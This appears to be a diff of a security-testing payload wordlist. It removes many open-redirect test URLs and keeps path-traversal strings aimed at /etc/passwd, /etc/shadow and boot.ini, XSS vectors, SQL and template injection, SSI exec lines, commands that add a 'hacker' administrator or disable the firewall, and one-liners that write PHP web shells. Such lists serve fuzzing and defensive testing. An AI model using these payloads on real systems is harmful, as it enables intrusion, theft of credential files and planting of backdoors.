 /\../\../\../\../\../\../\../\../
-////%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /0x2e0x2e0x2f0x2e0x2e0x2fboot.ini
 /0x2e0x2e0x5c0x2e0x2e0x5cboot.ini
 /..0x2f..0x2f..0x2f..0x2fboot.ini
@@ -4444,26 +4217,12 @@ C:\xampp\webalizer\webalizer.conf
 ..\..\..\/etc/passwd%00index.html
 /./././././././././././etc/shadow
 {{ get_user_file("/etc/hosts") }}
-//google.com@google.com/%2e%2e%2f
-//google.com@google.com/%2f%2e%2e
-//google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
 http:00330.00072.0000326.00000316
 http:3H6k7lIAiqjfNeN@0xd8.3856078
 http://3H6k7lIAiqjfNeN@0xd83ad6ce
 http://3H6k7lIAiqjfNeN@3627734734
-http://google.com@472.314.470.462
-http://google.com:80#@google.com/
-http://google.com:80?@google.com/
-https://%09/google.com@google.com
-/https://%5cgoogle.com@google.com
-//https://google.com@google.com//
-https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 /https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/google.com
-https:///www.google.com/%2f%2e%2e
-/https://www.google.com/%2f%2e%2e
-http://www.google.com\.google.com
 http:XY>.7d8T\205pZM@0xd8.3856078
 http://XY>.7d8T\205pZM@0xd83ad6ce
 http://XY>.7d8T\205pZM@3627734734
@@ -4545,22 +4304,10 @@ C:\xampp\phpMyAdmin\config.inc.php
 /etc/vhcs2/proftpd/proftpd.conf%00
 {{ get_user_file("C:\boot.ini") }}
 {{ get_user_file("/etc/passwd") }}
-///google.com@google.com/%2e%2e%2f
-///google.com@google.com/%2f%2e%2e
-///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
 /home\bin\stable\apache\php.ini%00
 http:3H6k7lIAiqjfNeN@00330.3856078
-http://google.com@00330.0x3a.54990
-http:google.com@0330.072.0326.0316
-http:google.com@[::216.58.214.206]
-http://google.com:80%40google.com/
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\tgoogle.com/
-https://google.com;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 //https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
 /https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-//https://www.google.com/%2e%2e%2f
-/https:///www.google.com/%2f%2e%2e
 http:XY>.7d8T\205pZM@00330.3856078
 <IMG SRC="javascript:alert('XSS')"
 <img \x00src=x onerror="alert(1)">
@@ -4588,7 +4335,6 @@ test* || perl -e 'print "X"x16096'
 \xampp\FileZillaFTP\Logs\error.log
 \xampp\MercuryMail\LOGS\access.log
 <xml SRC="xsstest.xml" ID=I></xml>
-&%0d%0a1Location:https://google.com
 0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
 0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
 0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd
@@ -4635,21 +4381,10 @@ C:\xampp\MercuryMail\LOGS\error.log
 .\/\.\.\/\.\.\/\.\.\/\.\/etc/passwd
 /..\/..\/..\/..\/..\/..\/etc/passwd
 \../\../\../\../\../\..//etc/passwd
-////google.com@google.com/%2e%2e%2f
-////google.com@google.com/%2f%2e%2e
-///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
-////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
 /home2\bin\stable\apache\php.ini%00
 http://00330.00072.0000326.00000316
 http:3H6k7lIAiqjfNeN@0xd8.072.54990
 http://3H6k7lIAiqjfNeN@0xd8.3856078
-http:google.com@0xd8.0x3a.0xd6.0xce
-http://google.com%2eⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-http://google.com%2f%2f.google.com/
-http://google.com%5c%5c.google.com/
-https://google.com@google.com/%2f..
-https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
-/https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 http:XY>.7d8T\205pZM@0xd8.072.54990
 http://XY>.7d8T\205pZM@0xd8.3856078
 & netsh firewall set opmode disable
@@ -4745,17 +4480,9 @@ C:\xampp\MercuryMail\LOGS\access.log
 ../../../..//etc/passwd%00index.html
 ..\..\..\..\/etc/passwd%00index.html
 <%= File.open('/etc/passwd').read %>
-////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
 ' GROUP BY columnnames having 1=1 --
 http://3H6k7lIAiqjfNeN@00330.3856078
 http:3H6k7lIAiqjfNeN@472.314.470.462
-http://google.com@0330.072.0326.0316
-http://google.com@[::216.58.214.206]
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%23.google.com/
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%3F.google.com/
-https://%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-/https://google.com@google.com/%2f..
-https://:@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@google.com
 http://XY>.7d8T\205pZM@00330.3856078
 http:XY>.7d8T\205pZM@472.314.470.462
 Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
@@ -4836,20 +4563,9 @@ C:\xampp\tomcat\conf\tomcat-users.xml
 ../../../../../../../../etc/passwd%00
 ../../../../..//etc/passwd;index.html
 ..\..\..\..\..\/etc/passwd;index.html
-//google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
-//google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 http:3H6k7lIAiqjfNeN@00330.0x3a.54990
 http://3H6k7lIAiqjfNeN@0xd8.072.54990
 http://%67%6f%6f%67%6c%65%2e%63%6f%6d
-http://google.com@0xd8.0x3a.0xd6.0xce
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@google.com/
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@google.com/
-https://%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-/https://%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-https:///google.com@google.com/%2e%2e
-/https://google.com@google.com/%2e%2e
-//https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
-http://www.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.google.com
 http:XY>.7d8T\205pZM@00330.0x3a.54990
 http://XY>.7d8T\205pZM@0xd8.072.54990
 <IMG SRC= onmouseover="alert('xxs')">
@@ -4916,12 +4632,8 @@ C:/windows/system32/sysprepsysprep.inf
 C:/windows/system32/sysprepsysprep.xml
 /dev/null; touch /tmp/blns.fail ; echo
 /etc/apache2/sites-enabled/000-default
-///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
-///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 http://3H6k7lIAiqjfNeN@472.314.470.462
 /http://%67%6f%6f%67%6c%65%2e%63%6f%6d
-http://google.com:80%40Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-https://google.com/https://google.com/
 http://XY>.7d8T\205pZM@472.314.470.462
 \necho INJECTX\nexit\n\033[2Asleep 5\n
 <svg><script>123<1>alert(123)</script>
@@ -5001,24 +4713,13 @@ C:/windows/system32/sysprepunattend.xml
 <!--#exec cmd="/bin/cat /etc/passwd"-->
 <!--#exec cmd="/bin/cat /etc/shadow"-->
 <foo><![CDATA[' or 1=1 or ''=']]></foo>
-//google.com@https:///google.com/%2e%2e
-////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
-////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-//google.com\@www.whitelisteddomain.tld
 http://3H6k7lIAiqjfNeN@00330.0x3a.54990
 http:3H6k7lIAiqjfNeN@0330.072.0326.0316
 http:3H6k7lIAiqjfNeN@[::216.58.214.206]
-http:google.com@[::ffff:216.58.214.206]
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.google.com/
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%5c%5c.google.com/
-https://google.com@google.com/%2e%2e%2f
-https://google.com@google.com/%2f%2e%2e
-https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
 http://XY>.7d8T\205pZM@00330.0x3a.54990
 http:XY>.7d8T\205pZM@0330.072.0326.0316
 http:XY>.7d8T\205pZM@[::216.58.214.206]
 <IMG SRC="jav   ascript:alert('XSS');">
-javascript://google.com?%a0alert%281%29
 /Library/WebServer/Documents/index.html
 <name>','')); phpinfo(); exit;/*</name>
 /NetServer\bin\stable\apache\php.ini%00
@@ -5033,7 +4734,6 @@ javascript://google.com?%a0alert%281%29
 ../../../../../var/log/httpd/access_log
 ../../../../../var/log/nginx/access.log
 ../../../../../var/log/nginx/access_log
-//www.whitelisteddomain.tld@google.com/
 ..%252f..%252f..%252fboot.ini;index.html
 ..%255c..%255c..%255cboot.ini;index.html
 %2e%2e/%2e%2e/%2e%2e/boot.ini;index.html
@@ -5042,8 +4742,6 @@ javascript://google.com?%a0alert%281%29
 %2e%2e%2f%2e%2e%2f/etc/passwd;index.html
 /\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c
 %2e%2e%5c%2e%2e%5c/etc/passwd;index.html
-//3H6k7lIAiqjfNeN@google.com@google.com/
-/%5cwww.whitelisteddomain.tld@google.com
 .../.../.../.../.../.../.../.../boot.ini
 ...\...\...\...\...\...\...\...\boot.ini
 ..//..//..//..//..//..//..//..//boot.ini
@@ -5076,9 +4774,6 @@ C:/windows/panther/unattend/unattend.xml
 ..\..\..\..\..\..\..\..\..\..\etc\shadow
 .\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
 http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
-https:///google.com@google.com/%2f%2e%2e
-/https://google.com@google.com/%2f%2e%2e
-/https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
 http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <i onwheel=alert(1)> Scroll over me </i>
@@ -5094,10 +4789,7 @@ Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 /usr/local/etc/apache/conf/httpd.conf%00
 ../../../../../var/log/apache/access.log
 ../../../../../var/log/apache/access_log
-///www.whitelisteddomain.tld@google.com/
-//www.whitelisteddomain.tld@google.com//
 \xampp\FileZillaFTP\FileZilla Server.xml
-//XY>.7d8T\205pZM@google.com@google.com/
 /..../..../..../..../..../..../..../..../
 /....\....\....\....\....\....\....\....\
 /..///..///..///..///..///..///..///..///
@@ -5105,7 +4797,6 @@ Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 /./.././.././.././.././.././.././.././../
 /.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\
 0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟
-/%09/www.whitelisteddomain.tld@google.com
 ..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd
 ..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd
 %252e%252e/%252e%252e/%252e%252e/boot.ini
@@ -5123,11 +4814,9 @@ Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 ..%2f..%2f..%2f..%2fboot.ini%00index.html
 /%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
 %%32%65%%32%65/%%32%65%%32%65//etc/passwd
-//3H6k7lIAiqjfNeN@google.com+@google.com/
 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c
 ..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
 ..%5c..%5c..%5c..%5cboot.ini%00index.html
-//%5cwww.whitelisteddomain.tld@google.com
 /.../.../.../.../.../.../.../.../boot.ini
 /...\...\...\...\...\...\...\...\boot.ini
 /..//..//..//..//..//..//..//..//boot.ini
@@ -5162,14 +4851,8 @@ C:/windows/system32/sysprepunattended.xml
 /../../../../../../../../../../etc/shadow
 \..\..\..\..\..\..\..\..\..\..\etc\shadow
 /etc/sysconfig/network-scripts/ifcfg-eth0
-//google.com+&@google.com#+@or.karmaz.pl/
 http://3H6k7lIAiqjfNeN@0330.072.0326.0316
 http://3H6k7lIAiqjfNeN@[::216.58.214.206]
-http://google.com@[::ffff:216.58.214.206]
-//https://google.com@google.com/%2e%2e%2f
-/https:///google.com@google.com/%2f%2e%2e
-https:///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
-/https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
 http:www.whitelisteddomain.tld@0xd83ad6ce
 http:www.whitelisteddomain.tld@3627734734
 http://XY>.7d8T\205pZM@0330.072.0326.0316
@@ -5189,11 +4872,7 @@ net localgroup Administrators hacker /ADD
 /usr/local/apps/apache/conf/httpd.conf%00
 /usr/local/etc/apache2/conf/httpd.conf%00
 /usr/local/pureftpd/etc/pure-ftpd.conf%00
-////www.whitelisteddomain.tld@google.com/
-///www.whitelisteddomain.tld@google.com//
-//XY>.7d8T\205pZM@google.com+@google.com/
 ../../../../../../../../../../../../../../
-//%09/www.whitelisteddomain.tld@google.com
 /%252e%252e/%252e%252e/%252e%252e/boot.ini
 /%252e%252e\%252e%252e\%252e%252e\boot.ini
 ..%252f..%252f..%252fboot.ini%00index.html
@@ -5206,7 +4885,6 @@ net localgroup Administrators hacker /ADD
 ..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
 ..%2f..%2f..%2f..%2f/etc/passwd;index.html
 ..%5c..%5c..%5c..%5c/etc/passwd;index.html
-///%5cwww.whitelisteddomain.tld@google.com
 " autofocus onkeyup="javascript:alert(123)
 ' autofocus onkeyup='javascript:alert(123)
 /../../../../../../../../../../../boot.ini
@@ -5223,18 +4901,14 @@ C:\xampp\FileZillaFTP\FileZilla Server.xml
 ..\..\..\..\..\..\/etc/passwd%00index.html
 ../../../../../../etc/passwd&=%3C%3C%3C%3C
 http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
-https://google.com/https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
-jaVAscript://google.com//%0d%0aalert(1);//
 {{request|attr(["__","class","__"]|join)}}
 /usr/local/apps/apache2/conf/httpd.conf%00
 /usr/local/pureftpd/sbin/pure-config.pl%00
-////www.whitelisteddomain.tld@google.com//
 /.//..//.//..//.//..//.//..//.//..//.//..//
 /./\/././\/././\/././\/././\/././\/././\/./
 /.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\
 /.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\
-///%09/www.whitelisteddomain.tld@google.com
 /..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f
 /..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c
 %252e%252e/%252e%252e/boot.ini%00index.html
@@ -5259,7 +4933,6 @@ jaVAscript://google.com//%0d%0aalert(1);//
 /%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66
 /%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini
-////%5cwww.whitelisteddomain.tld@google.com
 ..../..../..../..../..../..../..../boot.ini
 ....\....\....\....\....\....\....\boot.ini
 ..///..///..///..///..///..///..///boot.ini
@@ -5298,15 +4971,9 @@ C:/windows/system32/config/regback/software
 ..\..\..\..\..\..\..\/etc/passwd;index.html
 /../../../../../../../../../../etc/shadow^^
 ..\..\..\..\..\..\..\..\..\..\etc\shadow%00
-//google.com@https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
-http://google.com&www.whitelisteddomain.tld
-http://google.com\www.whitelisteddomain.tld
-https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
-https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 http:www.whitelisteddomain.tld@0xd8.3856078
 http://www.whitelisteddomain.tld@0xd83ad6ce
 http://www.whitelisteddomain.tld@3627734734
-http://www.whitelisteddomain.tld.google.com
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 & net localgroup Administrators hacker /ADD
 ; net localgroup Administrators hacker /ADD
@@ -5329,7 +4996,6 @@ http://www.whitelisteddomain.tld.google.com
 ../../../../../../../var/www/logs/error_log
 /var/www/vhosts/sitename/httpdocs/.htaccess
 <?xml version="1.0" encoding="ISO-8859-1"?>
-////%09/www.whitelisteddomain.tld@google.com
 () { 0; }; touch /tmp/blns.shellshock1.fail;
 0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
 0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
@@ -5354,7 +5020,6 @@ http://www.whitelisteddomain.tld.google.com
 ..%2f..%2f..%2f..%2f/etc/passwd%00index.html
 ..%%32%66..%%32%66..%%32%66..%%32%66boot.ini
 ..%%35%63..%%35%63..%%35%63..%%35%63boot.ini
-//3H6k7lIAiqjfNeN@google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 /..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini
 ..%5c..%5c..%5c..%5c..%5cboot.ini;index.html
 ..%5c..%5c..%5c..%5c/etc/passwd%00index.html
@@ -5378,10 +5043,6 @@ C:\ProgramFiles\xampp\apache\conf\httpd.conf
 \..\..\..\..\..\..\..\..\..\..\etc\passwd%00
 \..\..\..\..\..\..\..\..\..\..\etc\shadow%00
 http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
-http:google.com@00330.00072.0000326.00000316
-https:///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-/https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-https://www.whitelisteddomain.tld@google.com
 http:www.whitelisteddomain.tld@00330.3856078
 http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
 <img src=x\x09onerror="javascript:alert(1)">
@@ -5419,10 +5080,8 @@ Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 ../../../../../../../var/log/nginx/error_log
 ../../../../../../../var/www/logs/access.log
 ../../../../../../../var/www/logs/access_log
-//www.whitelisteddomain.tld@google.com/%2f..
 '`"><\x00script>javascript:alert(1)</script>
 '`"><\x3Cscript>javascript:alert(1)</script>
-//XY>.7d8T\205pZM@google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 ../../../../../../../../../../../../../../../
 👨‍👩‍👦 👨‍👩‍👧‍👦 👨‍👨‍👦 👩‍👩‍👧 👨‍👦 👨‍👧‍👦 👩‍👦 👩‍👧‍👦
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
@@ -5445,7 +5104,6 @@ Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
 /..%%32%66..%%32%66..%%32%66..%%32%66boot.ini
 /..%%35%63..%%35%63..%%35%63..%%35%63boot.ini
-//3H6k7lIAiqjfNeN@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 /..\../..\../..\../..\../..\../..\../boot.ini
 /./\/././\/././\/././\/././\/././\/./boot.ini
 /.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\boot.ini
@@ -5466,14 +5124,8 @@ C:\Program Files\xampp\apache\conf\httpd.conf
 ../../../../../../..//etc/passwd%00index.html
 ..\..\..\..\..\..\..\/etc/passwd%00index.html
 {% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
-//google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@or.karmaz.pl/
-http://3H6k7lIAiqjfNeN@google.com@google.com/
-//https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
-/https:///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-https://www.whitelisteddomain.tld@google.com/
 http:www.whitelisteddomain.tld@0xd8.072.54990
 http://www.whitelisteddomain.tld@0xd8.3856078
-http://XY>.7d8T\205pZM@google.com@google.com/
 <img src\x00=x onerror="javascript:alert(1)">
 <img src\x09=x onerror="javascript:alert(1)">
 <img src\x10=x onerror="javascript:alert(1)">
@@ -5500,8 +5152,6 @@ http://XY>.7d8T\205pZM@google.com@google.com/
 ../../../../../../../var/log/apache/error_log
 ../../../../../../../var/log/nginx/access.log
 ../../../../../../../var/log/nginx/access_log
-///www.whitelisteddomain.tld@google.com/%2f..
-//XY>.7d8T\205pZM@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 ${@print(system($_SERVER['HTTP_USER_AGENT']))}
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/
 /0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\
@@ -5545,17 +5195,10 @@ echo '<script>alert(1)</script>'// XXXXXXXXXXX
 ..\..\..\..\..\..\..\..\/etc/passwd;index.html
 ../../../../../../../../../../../../etc/shadow
 http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
-http://3H6k7lIAiqjfNeN@google.com+@google.com/
-http://google.com@00330.00072.0000326.00000316
-http://google.com+&@google.com#+@or.karmaz.pl/
-https://www.whitelisteddomain.tld@google.com//
-/https://www.whitelisteddomain.tld@google.com/
 http://www.whitelisteddomain.tld@00330.3856078
 http:www.whitelisteddomain.tld@472.314.470.462
 http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
-http://XY>.7d8T\205pZM@google.com+@google.com/
 <img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
-javascript://https://google.com/?z=%0Aalert(1)
 /Program Files\xampp\apache\conf\httpd.conf%00
 ../../../../../usr/local/apache/logs/error.log
 ../../../../../usr/local/apache/logs/error_log
@@ -5564,7 +5207,6 @@ javascript://https://google.com/?z=%0Aalert(1)
 ../../../../../../../var/log/apache/access.log
 ../../../../../../../var/log/apache/access_log
 /Volumes/webBackup/opt/apache2/conf/httpd.conf
-////www.whitelisteddomain.tld@google.com/%2f..
 /x:1/:///%01javascript:alert(document.cookie)/
 0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd
 0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd
@@ -5603,8 +5245,6 @@ echo "<?php system($_GET['cmd']); ?>" > cmd.php
 .\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\/etc/passwd
 /..\../..\../..\../..\../..\../..\../etc/passwd
 /..\../..\../..\../..\../..\../..\../etc/shadow
-https://%5cwww.whitelisteddomain.tld@google.com
-https://:@google.com\@www.whitelisteddomain.tld
 http:www.whitelisteddomain.tld@00330.0x3a.54990
 http://www.whitelisteddomain.tld@0xd8.072.54990
 %uff0e%uff0e%u2215%uff0e%uff0e%u2215/etc/passwd
@@ -5643,11 +5283,6 @@ http://www.whitelisteddomain.tld@0xd8.072.54990
 ../../../../../../../../../../../../etc/hosts%00
 ../../../../../../../..//etc/passwd%00index.html
 ..\..\..\..\..\..\..\..\/etc/passwd%00index.html
-http://google.com:80#@www.whitelisteddomain.tld/
-http://google.com:80?@www.whitelisteddomain.tld/
-https://%09/www.whitelisteddomain.tld@google.com
-/https://%5cwww.whitelisteddomain.tld@google.com
-//https://www.whitelisteddomain.tld@google.com//
 http://www.whitelisteddomain.tld@472.314.470.462
 <iframe src=http://ha.ckers.org/scriptlet.html <
 <!--[if]><script>javascript:alert(1)</script -->
@@ -5714,12 +5349,10 @@ echo "<?php include($_GET['page']); ?>" > rfi.php
 ../../../../../../../../../../../../etc/passwd%00
 ../../../../../../../../../../../../etc/shadow%00
 http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
-http://3H6k7lIAiqjfNeN@google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 http://www.whitelisteddomain.tld@00330.0x3a.54990
 http:www.whitelisteddomain.tld@0330.072.0326.0316
 http:www.whitelisteddomain.tld@[::216.58.214.206]
 http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
-http://XY>.7d8T\205pZM@google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 /Program Files\Apache Group\Apache\logs\error.log
 \Program Files\Apache Group\Apache\logs\error.log
 /..%u2215..%u2215..%u2215..%u2215..%u2215boot.ini
@@ -5773,12 +5406,8 @@ C:/programfiles/apachegroup/apache/conf/httpd.conf
 C:\ProgramFiles\ApacheGroup\Apache\conf\httpd.conf
 C:\ProgramFiles\ApacheGroup\Apache\logs\access.log
 && echo "<?php system($_GET['cmd']); ?>" > cmd.php
-http://3H6k7lIAiqjfNeN@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-http://google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@or.karmaz.pl/
 https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77
-https://www.whitelisteddomain.tld@google.com/%2f..
 http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
-http://XY>.7d8T\205pZM@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 ../../../../../../../../../../../../localstart.asp
 /Program Files\Apache Group\Apache\conf\httpd.conf
 \Program Files\Apache Group\Apache\conf\httpd.conf
@@ -5789,7 +5418,6 @@ http://XY>.7d8T\205pZM@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐ�
 %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\/etc/passwd
 /Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf
 /Volumes/webBackup/private/etc/httpd/httpd.conf%00
-///www.whitelisteddomain.tld@www.google.com/%2e%2e
 /..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini
 /..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini
 %252e%252e%252f%252e%252e%252fboot.ini%00index.html
@@ -5839,7 +5467,6 @@ C:/program files (x86)/xampp/apache/conf/httpd.conf
 .\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\/etc/passwd
 /../../../../../../../../../../../etc/passwd%00.jpg
 http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
-/https://www.whitelisteddomain.tld@google.com/%2f..
 http://www.whitelisteddomain.tld@0330.072.0326.0316
